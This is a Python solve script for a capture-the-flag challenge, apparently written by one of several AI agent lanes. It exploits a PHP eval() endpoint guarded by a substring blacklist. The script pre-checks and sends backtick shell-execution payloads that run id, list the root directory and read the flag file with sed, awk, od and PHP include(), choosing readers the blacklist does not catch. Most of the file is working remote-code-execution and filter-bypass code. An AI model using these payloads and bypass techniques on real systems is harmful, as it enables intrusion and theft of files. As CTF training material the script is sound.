#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Converge lane (agent-4 / task t4) — independent re-run for
http://node4.anna.nssctf.cn:24112/  (PHP eval() behind a substring blacklist).

This is deliberately a THIRD reader route: agent-2 won with ``nl``/``sort``
inside backticks, agent-3 won with PHP-side ``include()``.  Here the flag is
read again with shell readers that neither of them used — ``sed``, ``awk``,
``od`` — driven through ``printf(``...``)`` (the PHP ``print`` variant is also
exercised).  Every payload is checked against a local replica of the server
regex BEFORE it is transmitted, so a typo cannot burn a request.

Usage:
    python solve-converge.py            # full end-to-end verification
    python solve-converge.py check 'print(`id`);'
    python solve-converge.py send  'print(`id`);'
    python solve-converge.py --no-net   # offline filter matrix only
Exit status: 0 = flag reproduced by every reader, 1 = something failed.
"""

import re
import sys
import urllib.parse
import urllib.request

BASE = "http://node4.anna.nssctf.cn:24112/"
FLAG_FILE = "/fffffffffflagafag"
FLAG_RX = re.compile(r"NSSCTF\{[^}]+\}")

# verbatim single regex from the challenge source (case-insensitive)
BLACKLIST_RX = re.compile(
    r"sys|pas|read|file|ls|cat|tac|head|tail|more|less|php|base|echo|cp|"
    r"\$|\*|\+|\^|scan|\.|local|current|chr|crypt|show_source|high|"
    r"readgzfile|dirname|time|next|all|hex2bin|im|shell",
    re.I,
)

MARK_EVAL_OK = "看看你输入的参数！！！不叫样子！！"
MARK_BLOCKED = "你想干什么？？？？？？？？？"
MARK_NO_PARAM = "居然都不输入参数，可恶!!!!!!!!!"


def filter_verdict(payload):
    """Dry-run the server-side preg_match. -> (allowed, [hits])"""
    hits = sorted({m.group(0).lower() for m in BLACKLIST_RX.finditer(payload)})
    return (not hits), hits


def http_get(payload=None, timeout=25):
    url = BASE if payload is None else BASE + "?code=" + urllib.parse.quote(payload, safe="")
    req = urllib.request.Request(url, headers={"User-Agent": "curl/8.0"})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return url, r.read().decode("utf-8", "replace")
    except Exception as exc:  # noqa: BLE001
        return url, "<HTTP-ERROR %r>" % (exc,)


def split_marker(html):
    """-> (status, output-after-marker)"""
    if MARK_BLOCKED in html:
        return "BLOCKED", ""
    if MARK_NO_PARAM in html:
        return "NO-PARAM", html
    if MARK_EVAL_OK in html:
        tail = html.split(MARK_EVAL_OK, 1)[1]
        return "EVAL-OK", re.sub(r"^\s*<br\s*/?>", "", tail, count=1)
    return "UNKNOWN", html


def run(label, payload, expect_marker="EVAL-OK", allow_blocked=False):
    allowed, hits = filter_verdict(payload)
    if not allowed and not allow_blocked:
        print("[REFUSED locally] %s -> blacklist hits %s" % (label, hits))
        return {"label": label, "status": "REFUSED", "out": "", "hits": hits}
    url, html = http_get(payload)
    status, out = split_marker(html)
    print("-" * 78)
    print("step    : %s" % label)
    print("payload : %s" % payload)
    print("url     : %s" % url)
    print("offline : %s%s" % ("ACCEPT" if allowed else "REJECT(force)",
                              "" if allowed else " hits=%s" % hits))
    print("marker  : %s" % status)
    print("output  :")
    print(out.strip() if out.strip() else "(empty)")
    return {"label": label, "status": status, "out": out, "hits": hits, "url": url}


def main():
    argv = sys.argv[1:]
    no_net = "--no-net" in argv
    argv = [a for a in argv if a != "--no-net"]
    if argv and argv[0] == "check":
        allowed, hits = filter_verdict(argv[1])
        print("ACCEPT" if allowed else "REJECT hits=%s" % hits)
        return 0
    if argv and argv[0] == "send":
        url, html = http_get(argv[1])
        print("url:", url)
        print(html)
        return 0

    results = []
    failures = []

    # 0) source recovery ------------------------------------------------------
    print("=" * 78)
    print("STEP 0 - source recovery (no ?code= -> show_source(__FILE__))")
    url, html = (BASE, "<skipped --no-net>") if no_net else http_get(None)
    print("url     : %s" % url)
    for needle in ("preg_match", "eval($code)", "show_source(__FILE__)"):
        ok = needle in html
        print("  source contains %-24s : %s" % (needle, "YES" if ok else "NO"))
        if not no_net and not ok:
            failures.append("source leak missing %r" % needle)
    results.append({"label": "source-leak", "status": "EVAL-OK" if not no_net else "SKIP",
                    "out": "", "hits": []})

    if no_net:
        return 0 if not failures else 1

    # 1) the guard really is a filter (negative control) -----------------------
    results.append(run("negative control: banned 'ls'",
                       "print(`ls /`);", allow_blocked=True))
    if results[-1]["status"] != "BLOCKED":
        failures.append("negative control did not hit the blacklist")

    # 2) shell execution is alive ---------------------------------------------
    results.append(run("shell alive: id", "print(`id`);"))
    if "uid=33(www-data)" not in results[-1]["out"]:
        failures.append("id did not return www-data")

    # 3) locate the flag file (dir/find are clean; ls/cat are not) ------------
    results.append(run("locate flag file: dir /", "print(`dir /`);"))
    if "fffffffffflagafag" not in results[-1]["out"]:
        failures.append("flag file not visible in /")

    # 4) THREE independent readers, none used by the other lanes --------------
    readers = [
        ("reader 1 (new): printf + sed",
         "printf(`sed -n 1p %s`);" % FLAG_FILE),
        ("reader 2 (new): print + awk",
         "print(`awk 1 %s`);" % FLAG_FILE),
        ("reader 3 (new): print + od",
         "print(`od -c %s`);" % FLAG_FILE),
        ("cross-check: PHP include() (agent-3 route, re-run)",
         'include("%s");' % FLAG_FILE),
    ]
    flags = {}
    for label, payload in readers:
        r = run(label, payload)
        results.append(r)
        m = FLAG_RX.search(re.sub(r"\s+", "", r["out"]) if "od" in label else r["out"])
        if m:
            flags[label] = m.group(0)
        else:
            failures.append("%s produced no flag" % label)

    print("=" * 78)
    print("SUMMARY")
    for r in results:
        print("  %-52s %-10s %s" % (r["label"], r["status"],
                                    r["out"].strip().replace("\n", " ")[:48]))
    print()
    for label, flag in flags.items():
        print("  %-52s -> %s" % (label, flag))
    print()
    if len(set(flags.values())) == 1 and len(flags) == len(readers):
        print("VERDICT: SOLVED — flag reproduced by %d independent readers: %s"
              % (len(flags), next(iter(flags.values()))))
        return 0
    print("VERDICT: INCOMPLETE — failures: %s" % failures)
    return 1


if __name__ == "__main__":
    sys.exit(main())
